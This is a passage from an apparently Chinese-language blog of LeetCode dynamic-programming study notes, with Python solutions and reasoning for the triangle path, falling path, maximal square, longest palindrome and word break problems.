obstacleGrid<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="120-三角形最小路径和"><a class="markdownIt-Anchor" href="#120-三角形最小路径和"></a> <a href="https://leetcode.cn/problems/triangle/">120. 三角形最小路径和</a></h3><p>给定一个三角形 <code>triangle</code> ，找出自顶向下的最小路径和。</p><p>每一步只能移动到下一行中相邻的结点上。<strong>相邻的结点</strong> 在这里指的是 <strong>下标</strong> 与 <strong>上一层结点下标</strong> 相同或者等于 <strong>上一层结点下标 + 1</strong> 的两个结点。也就是说，如果正位于当前行的下标 <code>i</code> ，那么下一步可以移动到下一行的下标 <code>i</code> 或 <code>i + 1</code> 。</p><h4 id="思路-21"><a class="markdownIt-Anchor" href="#思路-21"></a> 思路</h4> <pre class="line-numbers language-none"><code class="language-none">很容易可以想到状态方程如下:设坐标(i,j)dp[i][j]&#x3D;min(dp[i-1][j-1],dp[i-1][j]) #j不在两端dp[i][j]&#x3D;dp[i-1][j] #j&#x3D;0dp[i][j]&#x3D;dp[i-1][j-1] #j&#x3D;n[m]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minimumTotal</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> triangle<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token comment">#m=Rows   n=Col</span>        m<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>triangle<span class="token punctuation">)</span>        n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment">#n是存储m行cols的列表</span>        <span class="token comment">#设置一个dp存储路径数 valueList=List</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment">#状态方程dp</span>        <span class="token comment">#先处理极端情况</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                    <span class="token keyword">elif</span> j<span class="token operator">==</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>triangle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种套路题关键点就是找状态方程，以及特殊情况的处理</p><h3 id="931-下降路径最小和"><a class="markdownIt-Anchor" href="#931-下降路径最小和"></a> <a href="https://leetcode.cn/problems/minimum-falling-path-sum/">931. 下降路径最小和</a></h3><pre class="line-numbers language-none"><code class="language-none">给你一个 &#96;n x n&#96; 的 **方形** 整数数组 &#96;matrix&#96; ，请你找出并返回通过 &#96;matrix&#96; 的**下降路径** 的 **最小和** 。**下降路径** 可以从第一行中的任何元素开始，并从每一行中选择一个元素。在下一行选择的元素和当前行所选元素最多相隔一列（即位于正下方或者沿对角线向左或者向右的第一个元素）。具体来说，位置 &#96;(row, col)&#96; 的下一个元素应当是 &#96;(row + 1, col - 1)&#96;、&#96;(row + 1, col)&#96; 或者 &#96;(row + 1, col + 1)&#96; 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="思路-22"><a class="markdownIt-Anchor" href="#思路-22"></a> 思路</h4><p>有比较明显的递推关系，分解子问题，就能写出来递推关系</p><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minFallingPathSum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> matrix<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token comment">#m=rows n=cols</span>        m<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token keyword">elif</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token keyword">elif</span> j<span class="token operator">==</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="221-最大正方"><a class="markdownIt-Anchor" href="#221-最大正方"></a> <a href="https://leetcode.cn/problems/maximal-square/">221. 最大正方</a></h3><p>在一个由 <code>'0'</code> 和 <code>'1'</code> 组成的二维矩阵内，找到只包含 <code>'1'</code> 的最大正方形，并返回其面积。</p><h4 id="思路-23"><a class="markdownIt-Anchor" href="#思路-23"></a> 思路</h4><p>这个题…想了几十分钟。。。。</p><p>感觉需要很强的抽象能力才能划分成子问题</p><ul><li><p>重新开个dp存储最大正方形的边长</p></li><li><p>设置dp[i] [j]为以(i,j)为右下角最大正方形的边长</p></li></ul><pre class="line-numbers language-none"><code class="language-none">当且仅当该位置为1的时候才存在正方形此处可以构成的最大正方形的边长，是其正上方，左侧，和左上界三者共同约束的，且为三者中的最小值加1。dp[i][j]&#x3D;min(dp[i-1][j-1],dp[i-1][j],dp[i][j-1])+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">maximalSquare</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> matrix<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        m<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'0'</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span>        max2<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>            temp<span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> temp <span class="token operator">></span> max2<span class="token punctuation">:</span>                max2<span class="token operator">=</span>temp        <span class="token keyword">return</span> max2<span class="token operator">*</span>max2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="字符串"><a class="markdownIt-Anchor" href="#字符串"></a> 字符串</h2><h3 id="5-最长回文子串"><a class="markdownIt-Anchor" href="#5-最长回文子串"></a> <a href="https://leetcode.cn/problems/longest-palindromic-substring/">5. 最长回文子串</a></h3><p>给你一个字符串 <code>s</code>，找到 <code>s</code> 中最长的回文子串。</p><p>如果字符串的反序与原始字符串相同，则该字符串称为回文字符串。</p><h4 id="思路-24"><a class="markdownIt-Anchor" href="#思路-24"></a> 思路</h4><p>最初的思路是暴力枚举</p><p>但是复杂度是n**3，想着有没有更好的算法</p><p><a href="https://leetcode.cn/problems/longest-palindromic-substring/solutions/255195/zui-chang-hui-wen-zi-chuan-by-leetcode-solution/?envType=study-plan-v2&amp;envId=dynamic-programming">最长回文子串详细解析</a></p><p>虽然但是，我觉得这题用dp还是不太好理解</p><p>中心拓展的方法更直观</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">expandAroundCenter</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>s<span class="token punctuation">,</span>l<span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> l<span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> r<span class="token operator">&lt;</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">and</span> s<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">:</span>            l<span class="token operator">-=</span><span class="token number">1</span>            r<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">def</span> <span class="token function">longestPalindrome</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        start<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            l1<span class="token punctuation">,</span>r1<span class="token operator">=</span>self<span class="token punctuation">.</span>expandAroundCenter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>i<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token comment">#拓展奇数回文子串</span>            l2<span class="token punctuation">,</span>r2<span class="token operator">=</span>self<span class="token punctuation">.</span>expandAroundCenter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>i<span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#拓展偶数回文子串</span>            <span class="token keyword">if</span> r1<span class="token operator">-</span>l1 <span class="token operator">></span> end<span class="token operator">-</span>start<span class="token punctuation">:</span>                end<span class="token punctuation">,</span>start<span class="token operator">=</span>r1<span class="token punctuation">,</span>l1            <span class="token keyword">if</span> r2<span class="token operator">-</span>l2 <span class="token operator">></span>end <span class="token operator">-</span>start<span class="token punctuation">:</span>                end<span class="token punctuation">,</span>start<span class="token operator">=</span>r2<span class="token punctuation">,</span>l2        <span class="token keyword">return</span> s<span class="token punctuation">[</span>start<span class="token punctuation">:</span>end<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dp思路</p><pre class="line-numbers language-none"><code class="language-none">方法二：动态规划回文天然具有「状态转移」性质：一个长度严格大于 222 的回文去掉头尾字符以后，剩下的部分依然是回文。反之，如果一个字符串头尾两个字符都不相等，那么这个字符串一定不是回文。「动态规划」的方法根据这样的性质得到。第 1 步：定义状态dp[i][j] 表示：子串 s[i..j] 是否为回文子串，这里子串 s[i..j] 定义为左闭右闭区间，即可以取到 s[i] 和 s[j]。第 2 步：思考状态转移方程根据头尾字符是否相等，需要分类讨论：dp[i][j] &#x3D; (s[i] &#x3D;&#x3D; s[j]) and dp[i + 1][j - 1]说明：「动态规划」的「自底向上」求解问题的思路，很多时候是在填写一张二维表格。由于 s[i..j] 表示 s 的一个子串，因此 i 和 j 的关系是 i &lt;&#x3D; j，只需要填这张表格对角线以上的部分；看到 dp[i + 1][j - 1] 就需要考虑特殊情况：如果去掉 s[i..j] 头尾两个字符子串 s[i + 1..j - 1] 的长度严格小于 222（不构成区间），即 j−1−(i+1)+1&lt;2j - 1 - (i + 1) + 1 &lt; 2j−1−(i+1)+1&lt;2 时，整理得 j−i&lt;3j - i &lt; 3j−i&lt;3，此时 s[i..j] 是否是回文只取决于 s[i] 与 s[j] 是否相等。结论也比较直观：j−i&lt;3j - i &lt; 3j−i&lt;3 等价于 j−i+1&lt;4j - i + 1 &lt; 4j−i+1&lt;4，即当子串 s[i..j]s[i..j]s[i..j] 的长度等于 222 或者等于 333 的时候，s[i..j] 是否是回文由 s[i] 与 s[j] 是否相等决定。第 3 步：考虑初始化单个字符一定是回文串，因此把对角线先初始化为 true，即 dp[i][i] &#x3D; true。根据第 2 步的说明：当 s[i..j] 的长度为 222 时，只需要判断 s[i] 是否等于 s[j]，所以二维表格对角线上的数值不会被参考。所以不设置 dp[i][i] &#x3D; true 也能得到正确结论。第 4 步：考虑输出一旦得到 dp[i][j] &#x3D; true，就记录子串的「长度」和「起始位置」。没有必要截取，这是因为截取字符串也有性能消耗。第 5 步：考虑优化空间下面给出的「参考代码」，在填表的过程中，只参考了左下方的数值。事实上可以优化，但是增加了代码编写和理解的难度，丢失了可读性和可解释性。在这里不做优化空间；填表应该遵守这样的原则：总是先得到小子串是否是回文的结果，然后大子串才能参考小子串的判断结果，所以填表顺序很重要；建议自己动手，画一下表格，相信会对「动态规划」作为一种「表格法」有更好的理解。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">longestPalindrome</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span>i <span class="token operator">==</span> j <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment">#先枚举子串长度</span>        maxlen<span class="token operator">=</span><span class="token number">1</span>        begin<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> s        <span class="token keyword">for</span> L <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#枚举左边界</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment">#由L，i确定右边界:</span>                j<span class="token operator">=</span>L<span class="token operator">+</span>i<span class="token operator">-</span><span class="token number">1</span>                <span class="token comment">#如果越界:</span>                <span class="token keyword">if</span> j<span class="token operator">>=</span>n<span class="token punctuation">:</span>                    <span class="token keyword">break</span>                                <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> j<span class="token operator">-</span>i <span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">True</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>                                <span class="token keyword">if</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token keyword">and</span> j<span class="token operator">-</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>maxlen<span class="token punctuation">:</span>                    maxlen<span class="token operator">=</span>j<span class="token operator">-</span>i<span class="token operator">+</span><span class="token number">1</span>                    begin<span class="token operator">=</span>i        <span class="token keyword">return</span> s<span class="token punctuation">[</span>begin<span class="token punctuation">:</span>begin<span class="token operator">+</span>maxlen<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="139-单词拆分"><a class="markdownIt-Anchor" href="#139-单词拆分"></a> <a href="https://leetcode.cn/problems/word-break/">139. 单词拆分</a></h3><p>给你一个字符串 <code>s</code> 和一个字符串列表 <code>wordDict</code> 作为字典。如果可以利用字典中出现的一个或多个单词拼接出 <code>s</code> 则返回 <code>true</code>。</p><p>**注意：**不要求字典中出现的单词全部都使用，并且字典中的单词可以重复使用。</p><p>刚开始的思路是这样的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wordBreak</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> wordDict<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        flag<span class="token operator">=</span><span class="token boolean">False</span>        i<span class="token operator">=</span><span class="token number">0</span>        j<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> flag<span class="token 